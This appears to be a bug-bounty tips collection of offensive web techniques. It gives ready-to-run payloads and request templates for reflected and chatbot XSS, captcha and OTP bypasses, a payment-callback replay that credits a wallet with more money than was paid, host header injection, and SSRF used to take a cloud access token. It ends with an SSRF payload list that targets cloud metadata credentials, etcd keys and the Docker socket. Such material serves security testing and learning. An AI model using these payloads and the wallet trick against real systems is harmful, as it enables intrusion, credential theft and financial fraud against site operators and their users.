# Writeups (Golden tips)

## Information Disclosure
```bash
# directory fuzzing for sensitive files
dirsearch -u “https://target.com” -t 150 -x 403,404,500,429 -i 200,301,302 --random-agent
```
## Reflected XSS (Non-Persistent XSS)
```bash
# XSS one liner
echo "target.com" | gauplus | grep "?" | qsreplace 'xssz"><img/src=x onerror=confirm(999)><!--' | httpx -mr '"><img/'
```
**What this command do?**

1st it look for urls using a tool called `gauplus` or you can use `waybackurls` or waymore, thes are great tools too to find archived urls, then it get all the urls with parameters and replace all the values of the parameter with the payload `xssz”><img/src=x onerror=confirm(999)><!--` than using `HTTPX` tool it will give you all the request that contain our malicious payload on the responce with no filters.

## The Blank Host Header trick
**Concise tip:** Try to find places in websites where the “host” HTTP header is reflected on the page. If you find this, try a blank host header in the request and the website may leak internal hostnames!

If a site is reflecting the host header in the response even when you it to something like example.com, it may be vulnerable to this. First, you need to change the HTTP protocol on the request from `HTTP/1.1`, the default, to `HTTP/1.0`. This is because empty host headers are invalid in the newer protocol. This is done in different ways depending on how you are replaying this HTTP request, but for example in Burp Repeater, you simply change `HTTP/1.1` in the top line of the request to `HTTP/1.0`. Next, you want to make the `host` HTTP header **blank**, so it looks like `Host:`. Now when you send the request, the response may show an IP address or a weird looking web address where the host header was previously reflected. **99%** of the time this is an **internal hostname or an internal IP address**. These can be used in other exploits to perform attacks on internal infrastructure, so companies generally do not want these leaked!

This is common on `Apache` servers when the bottom line of an error page reads something like **Apache Server at example.com Port 443** because example.com is simply being reflected from the host header in the request.


## Captcha Bypass
1. The following request is related to entering the system:
```html
POST /Auth/LoginWithPasswordCaptcha HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
---snip---

Connection: close{"username":"XXXXX","password":"111111","deviceName":"Netscape-5.0 (Windows)","captchaCode":"acvb","captchaId":"77e148fc-9fb8-48a5-af25-699761fbb223","deviceInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"}
```
2. If the attacker deletes the captcha code variable in the body and changes /Auth/LoginWithPasswordCaptcha to /Auth/LoginWithPassword in the url, the implemented captcha mechanism will be bypassed and the attacker can implement it this way. make a pervasive search attack.
```html
POST /Auth/LoginWithPassword HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
---snip---

Connection: close{"username":"XXXXX","password":"111111","deviceName":"Netscape-5.0 (Windows)","deviceInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"}
```

## OTP Bypass
1. The following request is a request to check the otp in the digital signature section:
```html
POST /SignatureCertificate/CheckOtp HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
---snip---

```
2. If the entered otp is wrong, the following answer will be returned:
```html
HTTP/1.1 400 Bad Request
Server: nginx
Content-Type: application/json; charset=utf-8
Set-Cookie: cookiesession1=678B286C2DE65BDFC274EB1DEB4B88A6;Expires=Tue, 29 Jul 2025 11:54:43 GMT;Path=/;HttpOnly
---snip---

{"isFailed":true,"isSuccess":false,"reasons":[{"message":"Your code has expired! Please get a new code!","metadata":{}}]," errors":[{"reasons":[],"message":"Your code has expired! Please get a new code!","metadata":{}}],"successes":[]}
```
3. If the attacker sets the `isFailed` value to `False` and the `isSuccess` value to `True` in this **response**, he can easily bypass the OTP authentication mechanism without having access to the correct code!

## Wallet Charging Bypass
1. By using this attack, the attacker can pay a smaller amount and charge a larger amount to his wallet by changing the tokens. First, buy 5$ normally in the charging section of the wallet and do not send the call back request, drop it and intercept it:

**Sample call back request**
```html
POST /ResultTransaction?trackingCode=51376940 HTTP/1.1
Host: target.com 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0 
---snip---
 
Token=28907420839252952&OrderId=51376940&TerminalNo=85053207&RRN=743808093455&status=0&HashCardNumber=1AAC1ADAF6CB22AC0D404DBF729427517001DB42EC74282B0A182A2B011968CF&Amount=100%2C000&SwAmount=&STraceNo=400534&DiscoutedProduct=
```
2. Then make a new payment with a higher amount and click cancel at the time of payment and intercept the corresponding call back and put the body of the previous request in this request and finally put the `orderId` of the higher amount request in the request.
3. Final request:
```html
POST /ResultTransaction?trackingCode=51489803 HTTP/1.1
Host: target.com 
---snip---

Token=28907420839252952&OrderId=51489803&TerminalNo=8521900539207&RRN=743807548093455&status=0&HashCardNumber=1AAC1ADAF6CB22AC450D404DBF7294277517001DB42EC74282B0A182A2B011968CF&Amount=100%2C000&SwAmount=&STraceNo=400534&DiscoutedProduct==
```
* Finally, the message of unsuccessful transaction is displayed to the user, but the **wallet is charged successfully**.

## XSS on Chatbot
1. Recon on wildcard target `*.target.com` by `subfinder` and `httpx`
2. Find `https://support.target.com/robots.txt` and then open the `https://support.target.com/` and see a chatbot
3. Send `<u>wearehackerone</u>`
4. Then guess what, it take the HTML tag and **render** it into the box
5. Send `<img src=1 href=1 onerror="javascript:alert(1)">`


![chatbot-xss](https://github.com/user-attachments/assets/0f75b8a4-b890-41e0-b3e0-e17dc450c8cf)



## Host Header Injection
1. After approximately seven hours of continuous hunting, I discovered a subdomain with a URL containing the parameter `path=`
2. My initial thought was to explore potential Server-Side Request Forgery (SSRF) or open redirect vulnerabilities. Despite trying several methods, I was unable to find anything significant.
3. I noticed the presence of the `X-Forwarded-Host` header
4. I initially tested this with apple.com, which resulted in a response redirecting to apple.com. The response header contained the value `Location: https://apple.com/en`. Not finding anything unusual, I carefully examined the response and decided to test further by changing the header value to `evil.com`.
5. To my surprise, instead of blocking the request, the server redirected me to `evil.com`. This indicated a significant **host header injection** vulnerability that could be exploited


![open-redirect](https://github.com/user-attachments/assets/8b4b6362-0b5d-4036-beea-51eff948f627)


## SSRF to leaking access token and other sensitive information
1. Use `cat waybackurl | gf ssrf`
2.  I tried testing ssrf, So I quickly opened my Burpsuite and put the burp collaborator link in the `__host` field and send the request, I clicked on poll now button and yes I got an HTTP interaction and the burp collaborator response was reflected on the screen

![ssrf-1](https://github.com/user-attachments/assets/14397651-6b2e-406c-8566-50137f416c0d)

3. I tried **XSS** with it by firing up an Apache server and uploading alert JavaScript payload / But i stopped because XSS won’t be so impactful and started to look for **ssrf**, In the `__host` parameter I put `169.254.169.254` and in the url I added `/latest/meta-data/iam/security-credentials/`

```html
https://redacted.redacted.com/latest/meta-data/iam/security-credentials/?__host=169.254.169.254&__proto=https
```

4. Sent the request. But it returned **502 BAD Gateway** I then changed `__proto` value to http but it didn’t either worked
5. Then I though of why not try other endpoints like google, digital ocean one’s

![ssrf-2](https://github.com/user-attachments/assets/cf53ed8a-b5a0-47fd-a93d-ce800bd8c38b)


6. So I quickly added this header and set the value of it to Google and send the request and yesss!! it did work
7. I then tried to get access token using
```html
GET /computeMetadata/v1/instance/service-accounts/default/token?__host=169.254.169.254&__proto=http
```
8. I screamed woah!! I got it, SSRF achieved

![ssrf-final](https://github.com/user-attachments/assets/6c546428-667a-41ec-9df7-e8f34acf84fa)

```text
# The payloads that are used by hackers to detect SSRF on a web application are given below:
# Basic SSRF
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
http://localhost:80
http://localhost:443
http://localhost:22

# SSRF using Various Encoding
1. Hex Encoding like using :
127.0.0.1 to 0x7f.0x0.0x0.0x1
localhost to 6C6F63616C686F7374

2. Octal Encoding like using :
127.0.0.1 translates to 0177.0.0.01

3. Dword Encoding is "Double Word" or 32-bit integer
http://127.0.0.1 to http://2130706433

4. URL Encoding :
http://localhost to http://%6c%6f%63%61%6c%68%6f%73%74

# SSRF To XSS
1. http://brutelogic.com.br/poc.svg -> simple alert

# Bypass localhost with [::]
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid

# Alternate IP encoding
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document

# SSRF URL for AWS Elastic Beanstalk
Requires the header “Metadata-Flavor: Google” or “X-Google-Metadata-Request: True”
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
Google allows recursive pulls
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true

# SSRF URL for Digital Ocean
Documentation available at https://developers.digitalocean.com/documentation/metadata/
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

# SSRF URL for Azure
Limited, maybe more exists?
https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
http://169.254.169.254/metadata/v1/maintenance
Update Apr 2017, Azure has more support; requires the header “Metadata: true”
https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=20
17-04-02&format=text

# SSRF URL for Kubernetes ETCD
Can contain API keys and internal ip and ports
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true

# SSRF URL for Docker
http://127.0.0.1:2375/v1.24/containers/json
Simple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json

```













